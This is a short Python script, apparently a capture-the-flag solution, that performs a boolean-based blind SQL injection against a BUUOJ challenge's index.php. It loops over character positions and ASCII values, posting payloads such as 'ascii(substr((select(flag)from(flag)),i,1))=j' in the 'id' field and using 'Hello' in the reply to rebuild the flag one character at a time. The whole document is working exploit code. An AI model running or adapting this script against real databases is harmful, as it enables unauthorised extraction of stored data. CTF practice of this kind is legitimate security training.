import requests
import time
url = "http://ca06a929-4e96-45d8-ba75-7bfc3100a603.node4.buuoj.cn:81/index.php"

result = ""
num = 0  # 用了来判断是不是flag已经拼完整了

for i in range(1,60):
    if num==1:
        break;

    for j in range(38,128):
        payload='(ascii(substr((select(flag)from(flag)),%d,1))=%d)'%(i,j)
        data = {
            "id": payload,
        }

        r = requests.post(url, data=data)

        r.encoding = r.apparent_encoding
        # time.sleep(0.1)
        # print(r.text)
        if 'Hello' in r.text:
            x=chr(j)
            result+=str(x)
            print(result)
            continue
        if "}" in result:
            print(result)
            num = 1
            break
        # print(payload)
